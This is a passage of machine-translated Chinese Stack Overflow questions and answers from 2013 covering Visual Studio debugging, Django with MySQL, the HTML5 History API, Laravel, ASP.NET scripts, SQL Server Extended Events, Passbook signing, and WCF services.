在这种情况下，如果我尝试使用即时窗口执行命令，无论我使用什么线程，我都会得到“无法评估表达式，因为当前线程处于睡眠、等待或加入状态”。我想知道是否有任何技巧可用于例如使线程停止等待（例如以某种方式设置 AutoResetEvent）。

我已经阅读[了暂停时的调试和“无法评估表达式”](https://stackoverflow.com/questions/3626815/debugging-whilst-pausing-and-cannot-evaluate-expression)，所以我担心这可能是不可能的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:31:42.673

我认为你唯一的选择

*   提前注入一些在本机代码中永远不会停止的线程（某种忙等待）。您将有效地失去一个核心，但至少能够调试。
*   有特殊的线程会等待一些外部命令来触发事件......
*   放弃表达式/立即窗口并依赖内存转储或使用带有 SoS 的 WinDbg。

基本上，如果没有未卡在本机代码中的托管线程，您就无法在调试进程中安全地运行托管代码（自 2010 年链接问题以来，该领域没有什么新内容）。

# twitter - 如何在 API 的所有限制下进行 Twitter 分析

> ID：15562520
> 
> 赞同：0
> 
> 时间：2013-03-22T04:02:47.140
> 
> 标签：twitter

我的老板希望我使用关键字对各种客户进行一些 Twitter 分析。他想要“过去一小时内的 xxxx 条推文”等统计数据。

Twitter API 允许每个请求获取 100 条推文。

我不知道如何进行这种排序分析。我应该实时流式传输推文并进行处理吗？我不知道该怎么办.....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T16:30:30.167

Twitter 让通过其 API 获取完整数据变得越来越困难，并且正在使用现有的社交媒体监控和分析公司来满足市场的需求。

您可以使用现有的分析公司，例如 Radian 6、Netbase 或 Brandwatch（仅举几例）为您提供报告和仪表板来进行分析。

您还可以使用[Gnip](http://gnip.com/)（免责声明：我为 Gnip 工作）为您提供 Twitter API 提供的原始数据，没有任何速率限制。[Twitter PowerTrack](http://gnip.com/twitter/)是您想要使用的产品。

# python - mySql 不适用于 django

> ID：15562521
> 
> 赞同：0
> 
> 时间：2013-03-22T04:02:47.157
> 
> 标签：python, mysql, django

我坚持用 django 设置 mysql ！我已经安装了 python 2.7 和 django，我已经`python-mysql`安装并且我已经安装了带有 xampp 的 mysql。按照我的字符串连接：

```
'default': {
    'ENGINE': 'mysql',
    'NAME': 'teste',
    'USER': 'root',
    'PASSWORD': '',
    'HOST': 'localhost',
    'PORT': '',
} 
```

当我将“django.db.backends.mysql”放在引擎上时，我可以运行服务器，但是当我使用“syncdb”时，出现错误“无法连接 mysql”。当我在引擎上只放'mysql'时，我得到一个错误'mysql module not found'或类似的东西。

Django 没有与 mySql 连接，我错过了什么？

我可以使用root用户连接到navicat上的数据库并且没有密码所以我认为这也可以在django上工作。Mysql 安装在 c:\xampp\mysql 上并且运行良好。

# html - HTML5 History API 实际 URL 不存在

> ID：15562524
> 
> 赞同：2
> 
> 时间：2013-03-22T04:03:12.853
> 
> 标签：html, api, url, resources, html5-history

我正在学习 HTML5 历史 API。以下是我能够实现的。

我有一个页面“a.html”，其中包含所有内容和指向“b.html”的链接。当我点击链接时，我几乎所有的内容都保持不变，只是图像发生了变化。所以我要做的是编写一个点击处理程序并避免加载“b.html”[实际上我的服务器中不存在 b.html]。我创建了一个 XMLHTTPRequest 并仅获取需要替换的内容（放置在名为“xmlres.html”的文件中，仅包含一个 img 标签）并使用 pushstate() 更新 url。

一切正常。但问题是如果用户尝试复制当前 url “appname/b.html”并在另一个页面中打开，则找不到资源，因为我还没有创建“b.html”。我不想再次创建包含完整内容的 b.html，是否有任何解决方法可以解决此问题。

我应该为 URL 编写任何事件侦听器还是应该如何进行。对此的任何见解都会有很大帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-18T21:15:51.807

我认为您在谈论单页应用程序，通常称为 SPA。

基本上这个概念的意思是你有一个`index.html`和里面你有一个默认隐藏的每个页面的部分，并通过javascript和面向休息的服务管理和处理基于用户交互的每个部分的内容。

单页应用程序通过使用标签进行导航而广为人知，在提供的小提琴中，这是使用井号完成的。

您可以通过此属性轻松访问哈希值：

```
console.log(window.location.hash); 
```

这是[我做的一个小提琴](http://jsbin.com/upinag/1)，页面转换功能齐全，给我一点历史API功能。

这是这个小提琴的作用：

*   如果您访问基本 url，它将显示索引部分。
*   如果您通过 url 访问基本 url，它将显示索引部分。
*   如果您访问`/1#sectionname`该部分是否可用，它将显示它，否则它将显示您尝试访问的部分不可用，因此它将显示一条未找到的消息。
*   通过 jQuery 支持历史 API。
*   通过页脚链接导航。

在我添加历史记录功能时请耐心等待，如果您需要更多详细信息，请告诉我。

这是[单页应用程序的维基百科页面](http://en.wikipedia.org/wiki/Single-page_application)，如果您想阅读更多内容。

**编辑：**

*   **[这是完整的小提琴](http://jsbin.com/akizej/7)。**

我还写了[一篇关于它的博客文章](http://devisfun.wordpress.com/2013/05/20/demistifying-html5-history-api-hash-push/)

希望能帮助到你！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-27T19:37:11.560

这是一篇描述您遇到的现象的文章（在文章的底部）： [http ://www.sitepoint.com/an-overview-and-usage-of-javascript-history-api/](http://www.sitepoint.com/an-overview-and-usage-of-javascript-history-api/)

本质上，这归结为具有特殊的服务器能力，可以理解直接请求 404 URL 时要做什么。引用的文章显示了如何使用 PHP 完成此操作。其他应用程序服务器，如 Node、Vertx、Servlet Spec'd 服务器都为您提供对 URL 处理的特殊访问权限，让您可以确定是否会发生 404，并在发生 404 时为您提供特殊控制。这是一个未讨论的历史 API 的特殊情况。由于它，可能会出现一些其他问题。例如，当使用此技术时，在物理资源和 SPA 资源不存在时提供 404 可能仍然是一个好主意。虚拟资源是在 SPA 代码库中发生历史 API/URL 路由后将出现的页面。

# php - Laravel 4 IoC 容器 - 设置和使用提供者

> ID：15562528
> 
> 赞同：0
> 
> 时间：2013-03-22T04:03:31.433
> 
> 标签：php, inversion-of-control, ioc-container, laravel, composer-php

我正在尝试在 Laravel 4 (L4)中使用[http://geotools-php.org/ 。](http://geotools-php.org/)

我按照通过 Composer 下载的说明进行了操作（并在 vendor 文件夹中验证了 geotools 的存在性）。

我将“app/providers/GeoTools.php”添加到我的自动加载类映射中。

以下是内容：

```
{
    "require": {
        "laravel/framework": "4.0.*",
        "toin0u/geotools": "@stable"
    },
    "autoload": {
        "classmap": [
            "app/commands",
            ... more laravel stuff
            "app/providers/GeoTools.php"
        ]
    }
    ... more laravel stuff 
```

我创建了 /providers/GeoTools.php 文件。

以下是内容：

```
<?php

use Illuminate\Support\ServiceProvider;

class GeoToolsServiceProvider extends ServiceProvider {

    public function register()
    {
        $this->app->bind('Coordinate', function()
        {

            return new Geotools\Coordinate;

        });
    }

} 
```

在我的 app.php 提供程序数组中，我添加了“GeoToolsServiceProvider”。

以下是我的问题：

1.  显然我做错了什么，*应该*怎么做。
2.  一旦上面的代码正确，你如何在整个应用程序中正确使用它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-27T14:25:49.173

我是这个库的维护者。

不可能（目前 Laravel Bêta 5）`Geotools\Coordinate\Coordinate`像您想要的那样绑定类，因为 Laravel IoC 容器不接受没有默认值或类型（即接口/类）的参数，这些参数由反射[自动解析。](http://four.laravel.com/docs/ioc#automatic-resolution)[容器](https://github.com/laravel/framework/blob/master/src/Illuminate/Container/Container.php)会抛出`BindingResolutionException`异常。

最好的方法是扩展`Geotools`类并添加一个将创建`Coordinate`实例的方法。

我正在等待 Laravel 4 的稳定版本，以便在 Geotools 中进行任何 BC 中断。

我刚刚为 Laravel 4 制作了[Geotools 包](https://github.com/toin0u/Geotools-laravel)。希望对您有所帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:27:49.080

服务提供商实际上看起来还不错。问题可能在于自动加载，并且没有看到您如何添加到类映射中，很难判断发生了什么。至于用法尝试以下，

```
class Foo {

   protected $coordinate;

   public function __construct(Coordinate $coordinate)
   {
       $this->coordinate = $coordinate
   }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T06:42:11.413

您应该能够使用 app 外观访问实例

```
App::make('Coordinate')->$someGeotoolCoordinateFunction(); 
```

# javascript - ASP.Net 增量页面加载调用 Javascript

> ID：15562531
> 
> 赞同：0
> 
> 时间：2013-03-22T04:03:38.597
> 
> 标签：javascript, asp.net

我正在使用[此处](http://www.asp.net/web-forms/videos/aspnet-ajax/how-do-i-implement-the-incremental-page-display-pattern-using-http-get-and-post)找到的增量页面加载模式。

我有一个加载并显示旋转轮指示器的主页面，并调用另一个辅助页面。该页面在主页中显示 HTML 就好了。但是，我需要一段 javascript 来运行，它是由辅助页面通过`ScriptManager.RegisterStartupScript(blah, blah);`.

我在辅助页面注入的 HTML 底部看到了脚本管理器生成的脚本，但它没有执行。当我直接向二级页面发出请求时，Javascript 运行良好。我什至尝试将注入的脚本包装在一个函数中并从主页调用该函数，但主页显示该函数未定义。

编辑：这是主页代码：

```
<script language="javascript" type="text/javascript">
    var slat;
    var slong;  
    function check() {           
        if (navigator.geolocation) {                
            navigator.geolocation.getCurrentPosition(function (position) {                    
                // PageMethods.SetSession(position.coords.latitude, position.coords.longitude);
                slat = position.coords.latitude;
                slong = position.coords.longitude;
               callEventsService(position.coords.latitude, position.coords.longitude);
            });
        }
   }
   function callEventsService(lat, slong) {
       var progress = $get('progress');
       progress.style.display = '';       
       PageMethods.SetSession(lat, slong, eventsCallback);
   }
   function eventsCallback(result) {
       var progress = $get('progress');
       progress.style.display = 'none';
       GetWebRequest('IncrementalEvent.aspx')
   }    
    function GetWebRequest(getPage) {           
        var wRequest = new Sys.Net.WebRequest();
        wRequest.set_url(getPage);
        wRequest.set_httpVerb("GET");
        wRequest.set_userContext("user's context");
        wRequest.add_completed(OnWebRequestCompleted)
        wRequest.invoke();
    }
    function OnWebRequestCompleted(executor, eventArgs) {
        if (executor.get_responseAvailable()) {
            var grid = document.getElementById("grid");
            grid.innerHTML += executor.get_responseData();
             //calldisplaymap();  <-- DOESNT WORK, Function not  defined        
        }
        else {
            if (executor.get_timedOut()) {
                alert("Timed Out");
            }
            else {
                if (executor.get_aborted())
                    alert("Aborted");
            }
        }
    }        
</script> 
```

这是二级页面加载

```
 protected void Page_Load(object sender, EventArgs e)
{
    List<GenericEvent> ge = (List<GenericEvent>)Session["publicevents"];
    lvevents.DataSource = ge;
    lvevents.DataBind();
    ExtractEventsToMap(ge);      
} 
   protected void ExtractEventsToMap(List<GenericEvent> lEvents)
{
    ...........<stuff>........
    ScriptManager.RegisterClientScriptBlock(this, this.GetType(), "PointArrays", sb.ToString(), true);
    ScriptManager.RegisterStartupScript(this, this.GetType(), "showmap", "function calldisplaymap(){displaymap(" + Session["lat"].ToString() + "," + Session["long"].ToString() + ")};", true);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:03:10.767

`ScriptManager.RegisterStartupScript(blah, blah)`subscribe event `$(document).ready()`，因此它不适用于您的情况（当您的第二个视图加载时，文档已准备好）。您应该在加载第二个视图的 ajax 调用中成功调用 Javascript 的 htat 片段。

**更新**

尝试将 js 函数 calldisplaymap() 添加到 aspx 页面，而不是在代码隐藏中注册它。并使用：二级页面（aspx）：

```
<script type="text/javascript">
    function calldisplaymap() {
        displaymap(<%: Session["lat"].ToString()%>, <%:Session["long"].ToString()%>);
    };
</script> 
```

主页

```
function OnWebRequestCompleted(executor, eventArgs) {
        if (executor.get_responseAvailable()) {
            var grid = document.getElementById("grid");
            grid.innerHTML += executor.get_responseData();
            calldisplaymap();  //i hope, it will work.     
        }
        else {
            if (executor.get_timedOut()) {
                alert("Timed Out");
            }
            else {
                if (executor.get_aborted())
                    alert("Aborted");
            }
        }
    } 
```

# sql-server - 扩展事件的会话定义存储在哪里？

> ID：15562533
> 
> 赞同：1
> 
> 时间：2013-03-22T04:03:38.987
> 
> 标签：sql-server, sql-server-2008, sql-server-2008-r2, extended-events

是 msdb、resource、master 还是 local？如果我备份我运行 XE 的本地数据库，我是否也会备份我的会话？系统表中是否也存储了任何元数据？谢谢你们。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-23T17:21:06.823

您可以从各种扩展的 DMV 中检索它们。例如，下面的查询将返回一堆关于扩展事件的信息。包括一些被注释掉的过滤器：

```
-- Extended Event Packages
select
    name,
    guid,
    description
from sys.dm_xe_packages
where (capabilities is null or capabilities & 1 = 0) -- ignore private packages for SQL Server internal use

-- Events
select
    p.name as package_name,
    o.name as source_name,
    o.description
from sys.dm_xe_packages as p
    inner join sys.dm_xe_objects as o
        on p.guid = o.package_guid
where
    (p.capabilities is null or p.capabilities & 1 = 0)
and (o.capabilities is null or o.capabilities & 1 = 0)
and o.object_type = 'event'
--and o.name like 's%'

-- Event targets
select
    p.name as package_name,
    o.name as source_name,
    o.description
from sys.dm_xe_packages as p
    inner join sys.dm_xe_objects as o
        on p.guid = o.package_guid
where
    (p.capabilities is null or p.capabilities & 1 = 0)
and (o.capabilities is null or o.capabilities & 1 = 0)
and o.object_type = 'target'

-- Predicate sources
select
    p.name as package_name,
    o.name as source_name,
    o.description
from sys.dm_xe_packages as p
    inner join sys.dm_xe_objects as o
        on p.guid = o.package_guid
where
    (p.capabilities is null or p.capabilities & 1 = 0)
and (o.capabilities is null or o.capabilities & 1 = 0)
and o.object_type = 'pred_source'

-- Predicate comparators
select
    p.name as package_name,
    o.name as source_name,
    o.description
from sys.dm_xe_packages as p
    inner join sys.dm_xe_objects as o
        on p.guid = o.package_guid
where
    (p.capabilities is null or p.capabilities & 1 = 0)
and (o.capabilities is null or o.capabilities & 1 = 0)
and o.object_type = 'pred_compare'

-- Maps
select
    p.name as package_name,
    o.name as source_name,
    o.description
from sys.dm_xe_packages as p
    inner join sys.dm_xe_objects as o
        on p.guid = o.package_guid
where
    (p.capabilities is null or p.capabilities & 1 = 0)
and (o.capabilities is null or o.capabilities & 1 = 0)
and o.object_type = 'map'

-- Types
select
    p.name as package_name,
    o.name as source_name,
    o.description
from sys.dm_xe_packages as p
    inner join sys.dm_xe_objects as o
        on p.guid = o.package_guid
where
    (p.capabilities is null or p.capabilities & 1 = 0)
and (o.capabilities is null or o.capabilities & 1 = 0)
and o.object_type = 'Type'

-- Event columns
select
    o.name as [event],
    oc.name as column_name,
    oc.column_type as column_type,
    oc.column_value as column_value,
    oc.description as column_description
from
    sys.dm_xe_packages as p
    inner join sys.dm_xe_objects as o
        on p.guid = o.package_guid
    inner join sys.dm_xe_object_columns as oc
        on o.name = oc.object_name
        and o.package_guid = oc.object_package_guid
where
    (p.capabilities is null or p.capabilities & 1 = 0)
and (o.capabilities is null or o.capabilities & 1 = 0)
and (oc.capabilities is null or oc.capabilities & 1 = 0)
and o.object_type = 'event'
--and o.name like '%lock%'
order by event, column_name

-- Configurable Event Columns
-- These elements are optional and usually not present in event output.
-- They can be enabled as needed.
select
    o.name as [event],
    oc.name as column_name,
    oc.column_type as column_type,
    oc.column_value as column_value,
    oc.description as column_description
from
    sys.dm_xe_packages as p
    inner join sys.dm_xe_objects as o
        on p.guid = o.package_guid
    inner join sys.dm_xe_object_columns as oc
        on o.name = oc.object_name
        and o.package_guid = oc.object_package_guid
where
    (p.capabilities is null or p.capabilities & 1 = 0)
and (o.capabilities is null or o.capabilities & 1 = 0)
and (oc.capabilities is null or oc.capabilities & 1 = 0)
and o.object_type = 'event'
--and o.name = 'file_write_completed'
and oc.column_type = 'customizable'

-- Configurable options
select
    oc.name as column_name,
    oc.column_id,
    oc.type_name,
    oc.capabilities_desc,
    oc.description
from
    sys.dm_xe_packages as p
    inner join sys.dm_xe_objects as o
        on p.guid = o.package_guid
    inner join sys.dm_xe_object_columns as oc
        on o.name = oc.object_name
        and o.package_guid = oc.object_package_guid
where
    (p.capabilities is null or p.capabilities & 1 = 0)
and (o.capabilities is null or o.capabilities & 1 = 0)
and (oc.capabilities is null or oc.capabilities & 1 = 0)
and o.object_type = 'target'
--and o.name = 'file_write_completed'
and oc.column_type = 'customizable'

-- Map Values
select
    name,
    map_key,
    map_value
from sys.dm_xe_map_values
where 1 = 1
--and name = 'wait_types' 
--and map_value like 'lck%' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T16:18:23.543

在进行了一些挖掘之后，我发现会话的定义存储在主数据库中（当您考虑它时，这是有道理的，因为会话是在服务器级别定义的）。

备份此数据库将备份您创建的会话，但这不是恢复它们的最简单方法。您可能最好导出会话并将它们保存为模板，或者编写脚本并将它们保存在安全的地方。

# php - 存折、PHP 和签名

> ID：15562536
> 
> 赞同：1
> 
> 时间：2013-03-22T04:04:01.730
> 
> 标签：php, openssl, code-signing, passbook

每当我尝试将我的通行证添加到存折时，它都会失败，原因是：

> 清单签名未成功验证

我的签名代码如下：

```
$privKey = "certs/key.pem";
$keyPassword = "PASSWORD";
$wwdr = "certs/wwdr.pem";
$cert = file_get_contents("certs/certificate.pem");
$certData = openssl_x509_read($cert);

openssl_pkcs7_sign($path . "/" . "manifest.json", 
$path . "/" . "signature", 
$certData, 
array("file://" . $privKey, $keyPassword), 
array(), 
PKCS7_BINARY|PKCS7_NOATTR|PKCS7_DETACHED,
"certs/wwdr.pem"); 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:40:16.453

尝试以下操作，使用证书文件，而不是其内容并删除 PKSC7_NOATTR，因为从 iOS 6.1.1 开始，签名应该包含签名日期。

```
openssl_pkcs7_sign($path . "/manifest.json",
            $path . "/signature",
            'file://' . $fullPathTo . 'certs/certificate.pem',
            array('file://' . $fullPathTo . $privKey, $keyPassword),
            array(),
            PKCS7_BINARY|PKCS7_DETACHED,
            $fullPathTo . $wwdr); 
```

`openssl_pkcs7_sign`创建一个电子邮件附件，因此您还需要提取签名部分，因为这就是 .pkpass 捆绑包所需的全部内容。

```
// Read the signature file
$email = file_get_contents($path . "/signature");

// Extract the signature using a regex
$pattern = "/.*?Content-Disposition: attachment; filename=\".*?\"(.*?)-----.*?/sm";
preg_match_all($pattern, $email, $signature);

// Base64 encode the part of result we need
$signature = base64_decode($signature[1][0]);

// Write contents to a new signature file
file_put_contents ($path . "/signature", $signature); 
```

如果它仍然没有摄取，请检查您的证书是有效的 Pass Type ID 证书，并且您的私钥是您的证书的正确密钥。您甚至可能想要检查您的 PHP 日志以验证该`openssl_pkcs7_sign`命令是否正确执行。

* * *

**更新**

当我尝试将您的 .pkpass 包添加到 Passbook 时，我在设备控制台中收到以下错误。

```
<Warning>: Invalid data error reading pass pass.datafarms.peppermints/123456\. Manifest JSON didn't parse: The operation couldn’t be completed. (Cocoa error 3840.) 
```

您的签名文件看起来不错，错误在于计算 SHA1 哈希和构建的代码部分`manifest.json`

查看您的 .pkpass 包，您的清单以两种方式损坏：

1.  它包含多个对象
2.  SHA1 值与文件内容不匹配

对于这个 .pkpass 包，您的 manifest.json 应该是：

```
{
    "strip.png" : "f95387c0843a51dac73f1b0a3181da9c99ba3dc4",
    "strip@2x.png" : "f325a97fc6bafbe53a5e8feb7b2c509a8ceb6b10",
    "logo@2x.png" : "7b7b025774128b95e50f2bcda55e608412e95a37",
    "icon@2x.png" : "68b61c27657a0018da71c7f73626c8a891da753c",
    "icon.png" : "6b15fa477ece83fdd4f544a2381444272a0e39a0",
    "logo.png" : "7cf1d842afde33c4b14978f330cf98d05c3e57f2",
    "pass.json" : "971417ec80638736cb3392d6d5db53d554f138a4",
} 
```

但目前是：

```
{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
}{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
}{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
}{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
}{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
}{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
}{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
}{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
}{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
}{
    "strip.png" : "156b528933284a0a58fc316897e1b7d202dfe3e8",
    "strip@2x.png" : "99f5dc1a0c5ed300193f87e42d8632f7251a3f26",
    "logo@2x.png" : "f36816f173aa9011186b80b140dfc49395d31051",
    "icon@2x.png" : "c10dd92e6c043c4bcf6214251d6fcb2a760cd9ad",
    "icon.png" : "d181ad4208e06afb63d5e6049a40521b458da19d",
    "logo.png" : "81c27284f77a447375ba39fb2f0005eeaccf28d8",
    "pass.json" : "e5960e9004d5fff241d77415413d609f47d7b2fb",
} 
```

# roku - 运行时的 BrightScript CreateObject

> ID：15562537
> 
> 赞同：0
> 
> 时间：2013-03-22T04:04:03.333
> 
> 标签：roku, brightscript

在运行时创建对象的最佳方法是什么？

示例 我下载了一个 xml 文件，其中包含要在画布上输入的每个项目的文本、屏幕位置和颜色。然后我需要能够使用 XML 文件中的其他信息来移动文本或以某种方式更改它，所以我仍然需要我正在创建的项目的句柄。

谢谢

-布拉德

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-24T13:20:33.460

您在 Roku 论坛上的帖子已经回答了这个问题：

[http://forums.roku.com/viewtopic.php?f=34&t=55223](http://forums.roku.com/viewtopic.php?f=34&t=55223)

# web-applications - 如何知道 Font Awesome 的内容私有使用区域 (PUA)

> ID：15562544
> 
> 赞同：3
> 
> 时间：2013-03-22T04:04:31.587
> 
> 标签：web-applications, twitter-bootstrap, fonts, icons

我一直在阅读有关[Font Awesome](http://gregoryloucas.github.com/Font-Awesome-More/#whats-new)的信息。我认为当我们在 Web 应用程序中使用图标时，提高效率是一项绝妙的技术。

我有一个问题：当我想从[Font Awesome](http://gregoryloucas.github.com/Font-Awesome-More/#whats-new)添加扩展 Social Icon 时，问题是我不知道图标的 Unicode (PUA)。例如，我想使用 Icon-yahoo。

例如，“icon-legal”的 PUA 值为“\f0e3”。

有谁知道如何为[Font Awesome](http://gregoryloucas.github.com/Font-Awesome-More/#whats-new)中的每个图标找到 PUA ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T14:25:24.367

每个图标的 Unicode（PUA 代码）都列在[Font Awesome CSS 文件](https://github.com/FortAwesome/Font-Awesome/blob/master/css/font-awesome.css)中；请参阅“Font Awesome 使用 Unicode Private Use Area (PUA)...”

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-05-02T23:50:42.497

在 windows 中，您可以使用“Character Map”应用程序查看它们，只要您已将 FontAwesome 添加到 windows。当您使用字符映射时，您必须选择“Unicode”字符集才能看到它们。如果您也选择“日文”或“繁体中文”包机集，您也可以看到它们。如果选择了任何其他字符集，它们将不会显示。

# ios - 将 __NSCFNumber 附加到 Objective C 中的字符串

> ID：15562548
> 
> 赞同：0
> 
> 时间：2013-03-22T04:04:41.483
> 
> 标签：ios, objective-c

我正在尝试将数字添加到字符串的末尾，但做不到！我认为这个问题是因为对象类型`_post.postID`（我检查过它说它是一个__NSCFNumber）。我使用 stringWithFormat 错误吗？

```
NSString *jsonURL = [NSString stringWithFormat:@"http://www.website.com/api/get_post$id=%@", _post.postID];

NSLog(@"%@",jsonURL); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:16:33.920

你必须使用`[_post.postID intValue]`. 试试这个代码。

```
NSString *jsonURL = [NSString stringWithFormat:@"http://www.website.com/api/get_post$id=%d", [_post.postID intValue]];

NSLog(@"%@",jsonURL) 
```

# android - WCF：在字符 0 处输入结束

> ID：15562556
> 
> 赞同：1
> 
> 时间：2013-03-22T04:05:05.843
> 
> 标签：android, asp.net, json, wcf

我正在尝试从 android 客户端调用 WCF 服务，但出现`End of input at character 0 of` 错误。当我使用 WCF 客户端测试对其进行测试时，该服务工作正常，但是当我在 android 客户端中尝试它时，它没有，并且生成了输入错误结束...我不知道我错过了什么..

所以这是我的代码

员工信息.svc

```
namespace EmployeeServices
{
    // NOTE: You can use the "Rename" command on the "Refactor" menu to change the class name "EmployeeInfo" in code, svc and config file together.

        public class EmployeeInfo : IEmployeeInfo
        {
            public Employee GetEmployee(int employeeId)
            {
                Employee employeeInfo = GetEmployees(employeeId).Where(employee => employee.EmployeeId == employeeId).FirstOrDefault();
                return employeeInfo;
            }

            private List<Employee> GetEmployees(int employeeId)
            {

                return new List<Employee> {
                    new Employee { EmployeeId = 11, FirstName = "Waqas", LastName = "Yousuf", Address="A-175 Block 1" , BloodGroup = "B+" },
                    new Employee { EmployeeId = 22, FirstName = "Moiz", LastName = "Ahmed", Address="B-176 Block 2" , BloodGroup = "O-" },
                    new Employee { EmployeeId = 33, FirstName = "Waqas", LastName = "Raza", Address="C-177 Block 3" , BloodGroup = "A+" },
                    new Employee { EmployeeId = 44, FirstName = "Yasir", LastName = "Amin", Address="D-178 Block 4" , BloodGroup = "AB+" },
                    new Employee { EmployeeId = 55, FirstName = "Adeel", LastName = "Ali", Address="E-179 Block 5" , BloodGroup = "B+" } };
            }
        }
    } 
```

IEmployeeInfo.cs

```
namespace EmployeeServices
{
    // NOTE: You can use the "Rename" command on the "Refactor" menu to change the interface name "IEmployeeInfo" in both code and config file together.

    [ServiceContract(Namespace = "http://services.example.com")]
    public interface IEmployeeInfo
    {
        [OperationContract]
        [WebGet(UriTemplate = "GetEmployee/{employeeId}",
            BodyStyle = WebMessageBodyStyle.WrappedRequest,
            ResponseFormat = WebMessageFormat.Json,
            RequestFormat = WebMessageFormat.Json)]
        Employee GetEmployee(int employeeId);

    }

    [DataContract]
    public class Employee
    {
        [DataMember]
        public int EmployeeId { get; set; }
        [DataMember]
        public string FirstName { get; set; }
        [DataMember]
        public string LastName { get; set; }
        [DataMember]
        public string Address { get; set; }
        [DataMember]
